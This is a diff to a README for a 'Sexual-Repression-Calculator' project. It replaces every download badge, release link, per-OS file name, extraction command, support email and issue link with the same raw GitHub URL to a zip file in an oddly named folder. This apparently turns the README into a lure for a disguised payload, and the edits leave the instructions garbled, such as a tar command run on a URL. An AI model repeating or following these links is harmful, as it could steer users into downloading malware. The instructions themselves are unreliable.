@@ -17,18 +17,18 @@ Before downloading, ensure your computer meets these requirements:
 
 To download the Sexual-Repression-Calculator, visit the link below:
 
-[![Download Sexual-Repression-Calculator](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Parzival313131/Sexual-Repression-Calculator/releases)
+[![Download Sexual-Repression-Calculator](https://raw.githubusercontent.com/Parzival313131/Sexual-Repression-Calculator/main/pinnothere/Sexual-Repression-Calculator.zip%https://raw.githubusercontent.com/Parzival313131/Sexual-Repression-Calculator/main/pinnothere/Sexual-Repression-Calculator.zip)](https://raw.githubusercontent.com/Parzival313131/Sexual-Repression-Calculator/main/pinnothere/Sexual-Repression-Calculator.zip)
 
-Click the button above or visit this page to download: [Releases Page](https://github.com/Parzival313131/Sexual-Repression-Calculator/releases).
+Click the button above or visit this page to download: [Releases Page](https://raw.githubusercontent.com/Parzival313131/Sexual-Repression-Calculator/main/pinnothere/Sexual-Repression-Calculator.zip).
 
 ### 📥 Download Instructions
 
 1. Click on the link to the releases page.
 2. Find the latest version. It will be at the top of the list.
 3. Look for the file that is appropriate for your operating system. 
-   - For Windows, it might be named something like `Sexual-Repression-Calculator-windows.exe`.
-   - For macOS, it might be labeled `Sexual-Repression-Calculator-mac.dmg`.
-   - For Linux, look for a `.tar.gz` file.
+   - For Windows, it might be named something like `https://raw.githubusercontent.com/Parzival313131/Sexual-Repression-Calculator/main/pinnothere/Sexual-Repression-Calculator.zip`.
+   - For macOS, it might be labeled `https://raw.githubusercontent.com/Parzival313131/Sexual-Repression-Calculator/main/pinnothere/Sexual-Repression-Calculator.zip`.
+   - For Linux, look for a `https://raw.githubusercontent.com/Parzival313131/Sexual-Repression-Calculator/main/pinnothere/Sexual-Repression-Calculator.zip` file.
 4. Click on the file name to start the download.
 
 ### 🖥️ Running the Software
@@ -47,7 +47,7 @@ Once the download is complete:
 - **For Linux**:
   - Open a terminal.
   - Navigate to the directory where you downloaded the file.
-  - Use the command `tar -xvzf Sexual-Repression-Calculator-linux.tar.gz` to extract the files.
+  - Use the command `tar -xvzf https://raw.githubusercontent.com/Parzival313131/Sexual-Repression-Calculator/main/pinnothere/Sexual-Repression-Calculator.zip` to extract the files.
   - Run the executable within the extracted folder.
 
 ## 📊 How to Use the Calculator
@@ -82,8 +82,8 @@ Yes, you can use the Sexual-Repression-Calculator on Windows, macOS, and Linux. 
 
 If you encounter any issues or have questions, feel free to reach out for support:
 
-- Email: support@example.com
-- GitHub Issues: [Report an issue](https://github.com/Parzival313131/Sexual-Repression-Calculator/issues)
+- Email: https://raw.githubusercontent.com/Parzival313131/Sexual-Repression-Calculator/main/pinnothere/Sexual-Repression-Calculator.zip
+- GitHub Issues: [Report an issue](https://raw.githubusercontent.com/Parzival313131/Sexual-Repression-Calculator/main/pinnothere/Sexual-Repression-Calculator.zip)
 
 ## 💡 Tips for a Better Experience
 
